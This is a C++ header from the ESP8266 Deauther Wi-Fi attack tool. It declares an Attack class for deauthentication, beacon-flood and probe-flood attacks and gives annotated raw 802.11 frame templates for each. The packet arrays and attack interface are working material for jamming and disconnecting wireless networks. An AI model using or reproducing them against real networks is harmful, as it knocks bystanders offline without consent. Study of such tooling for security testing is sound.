/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#pragma once

#include "Arduino.h"
#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}
#include "language.h"
#include "Accesspoints.h"
#include "Stations.h"
#include "SSIDs.h"
#include "Scan.h"

extern SSIDs ssids;
extern Accesspoints accesspoints;
extern Stations     stations;
extern Scan scan;

extern uint8_t  wifi_channel;
extern uint8_t  broadcast[6];
extern uint32_t currentTime;

extern bool macBroadcast(uint8_t* mac);
extern void getRandomMac(uint8_t* mac);
extern void setOutputPower(float dBm);
extern String macToStr(const uint8_t* mac);
extern String bytesToStr(const uint8_t* b, uint32_t size);
extern void setWifiChannel(uint8_t ch, bool force);
extern bool writeFile(String path, String& buf);
extern int8_t free80211_send(uint8_t* buffer, uint16_t len);

class Attack {
    public:
        Attack();

        void start();
        void start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout);
        void stop();
        void update();

        void enableOutput();
        void disableOutput();
        void status();
        String getStatusJSON();

        bool deauthAP(int num);
        bool deauthStation(int num);
        bool deauthName(int num);
        bool deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch);

        bool sendBeacon(uint8_t tc);
        bool sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2);

        bool sendProbe(uint8_t tc);
        bool sendProbe(uint8_t* mac, const char* ssid, uint8_t ch);

        bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch);

        bool isRunning();

        uint32_t getDeauthPkts();
        uint32_t getBeaconPkts();
        uint32_t getProbePkts();
        uint32_t getDeauthMaxPkts();
        uint32_t getBeaconMaxPkts();
        uint32_t getProbeMaxPkts();

        uint32_t getPacketRate();

    private:
        void deauthUpdate();
        void deauthAllUpdate();
        void beaconUpdate();
        void probeUpdate();

        void updateCounter();

        bool running = false;
        bool output  = true;

        struct AttackType {
            bool     active        = false; // if attack is activated
            uint16_t packetCounter = 0;     // how many packets are sent per second
            uint16_t maxPkts       = 0;     // how many packets should be sent per second
            uint8_t  tc            = 0;     // target counter, i.e. which AP or SSID
            uint32_t time          = 0;     // time last packet was sent
        };

        AttackType deauth;
        AttackType beacon;
        AttackType probe;
        bool deauthAll = false;

        uint32_t deauthPkts = 0;
        uint32_t beaconPkts = 0;
        uint32_t probePkts  = 0;

        uint32_t tmpPacketRate = 0;
        uint32_t packetRate    = 0;

        uint8_t apCount = 0;
        uint8_t stCount = 0;
        uint8_t nCount  = 0;

        int8_t tmpID = -1;

        uint16_t packetSize      = 0;
        uint32_t attackTime      = 0; // for counting how many packets per second
        uint32_t attackStartTime = 0;
        uint32_t timeout         = 0;

        // random mac address for making the beacon packets
        uint8_t mac[6] = { 0xAA, 0xBB, 0xCC, 0x00, 0x11, 0x22 };

        uint8_t deauthPacket[26] = {
            /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
            /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
            /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
            /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
            /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
            /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
            /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
        };

        uint8_t probePacket[68] = {
            /*  0 - 1  */ 0x40, 0x00,                                                                   // Type: Probe Request
            /*  2 - 3  */ 0x00, 0x00,                                                                   // Duration: 0 microseconds
            /*  4 - 9  */ 0xff, 0xff,               0xff,               0xff,               0xff, 0xff, // Destination: Broadcast
            /* 10 - 15 */ 0xAA, 0xAA,               0xAA,               0xAA,               0xAA, 0xAA, // Source: random MAC
            /* 16 - 21 */ 0xff, 0xff,               0xff,               0xff,               0xff, 0xff, // BSS Id: Broadcast
            /* 22 - 23 */ 0x00, 0x00,                                                                   // Sequence number (will be replaced by the SDK)
            /* 24 - 25 */ 0x00, 0x20,                                                                   // Tag: Set SSID length, Tag length: 32
            /* 26 - 57 */ 0x20, 0x20,               0x20,               0x20,                           // SSID
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            /* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
            /* 60 */ 0x82,            // 1(B)
            /* 61 */ 0x84,            // 2(B)
            /* 62 */ 0x8b,            // 5.5(B)
            /* 63 */ 0x96,            // 11(B)
            /* 64 */ 0x24,            // 18
            /* 65 */ 0x30,            // 24
            /* 66 */ 0x48,            // 36
            /* 67 */ 0x6c             // 54
        };

        uint8_t beaconPacket[109] = {
            /*  0 - 3  */ 0x80,   0x00,                 0x00,                 0x00,                                                                         // Type/Subtype: managment beacon frame
            /*  4 - 9  */ 0xFF,   0xFF,                 0xFF,                 0xFF,                 0xFF,                 0xFF,                             // Destination: broadcast
            /* 10 - 15 */ 0x01,   0x02,                 0x03,                 0x04,                 0x05,                 0x06,                             // Source
            /* 16 - 21 */ 0x01,   0x02,                 0x03,                 0x04,                 0x05,                 0x06,                             // Source

            // Fixed parameters
            /* 22 - 23 */ 0x00,   0x00,                                                                                                                     // Fragment & sequence number (will be done by the SDK)
            /* 24 - 31 */ 0x83,   0x51,                 0xf7,                 0x8f,                 0x0f,                 0x00,                 0x00, 0x00, // Timestamp
            /* 32 - 33 */ 0x64,   0x00,                                                                                                                     // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
            /* 34 - 35 */ 0x31,   0x00,                                                                                                                     // capabilities Tnformation

            // Tagged parameters

            // SSID parameters
            /* 36 - 37 */ 0x00,   0x20, // Tag: Set SSID length, Tag length: 32
            /* 38 - 69 */ 0x20,   0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20, // SSID

            // Supported Rates
            /* 70 - 71 */ 0x01,   0x08,                                             // Tag: Supported Rates, Tag length: 8
            /* 72 */ 0x82,                                                          // 1(B)
            /* 73 */ 0x84,                                                          // 2(B)
            /* 74 */ 0x8b,                                                          // 5.5(B)
            /* 75 */ 0x96,                                                          // 11(B)
            /* 76 */ 0x24,                                                          // 18
            /* 77 */ 0x30,                                                          // 24
            /* 78 */ 0x48,                                                          // 36
            /* 79 */ 0x6c,                                                          // 54

            // Current Channel
            /* 80 - 81 */ 0x03,   0x01,                                             // Channel set, length
            /* 82 */ 0x01,                                                          // Current Channel

            // RSN information
            /*  83 -  84 */ 0x30, 0x18,
            /*  85 -  86 */ 0x01, 0x00,
            /*  87 -  90 */ 0x00, 0x0f,                 0xac,                 0x02,
            /*  91 -  92 */ 0x02, 0x00,
            /*  93 - 100 */ 0x00, 0x0f,                 0xac,                 0x04,                 0x00,                 0x0f,                 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
            /* 101 - 102 */ 0x01, 0x00,
            /* 103 - 106 */ 0x00, 0x0f,                 0xac,                 0x02,
            /* 107 - 108 */ 0x00, 0x00
        };
};